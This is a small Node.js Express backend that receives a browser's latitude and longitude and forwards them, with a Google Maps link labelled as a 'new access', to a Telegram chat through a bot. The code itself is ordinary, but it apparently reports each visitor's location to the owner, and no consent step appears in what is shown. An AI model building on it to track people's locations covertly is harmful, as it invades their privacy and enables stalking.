require('dotenv').config();
const express    = require('express');
const bodyParser = require('body-parser');
const cors       = require('cors');

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID   = process.env.CHAT_ID;

const app = express();
// libera só o Angular em dev
app.use(cors({ origin: 'http://localhost:4200' }));
app.use(bodyParser.json());

app.post('/api/send-location', async (req, res) => {
  const { latitude, longitude } = req.body;
  if (typeof latitude !== 'number' || typeof longitude !== 'number') {
    return res.status(400).json({ error: 'latitude e longitude devem ser números' });
  }
  // monta link do Google Maps
  const mapsUrl = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
  const text    = `📍 Novo acesso:\nLat: ${latitude}\nLng: ${longitude}\n🗺️ ${mapsUrl}`;

  try {
    const telegramRes = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method:  'POST',
        headers: { 'Content-Type':'application/json' },
        body:    JSON.stringify({ chat_id: CHAT_ID, text })
      }
    );
    if (!telegramRes.ok) throw await telegramRes.text();
    return res.json({ ok:true });
  } catch (err) {
    console.error('Erro enviando pro Telegram:', err);
    return res.status(500).json({ error:'erro interno' });
  }
});

const PORT = process.env.PORT || 3001;
app.listen(PORT, ()=> console.log(`🛰️  API rodando em http://localhost:${PORT}`));
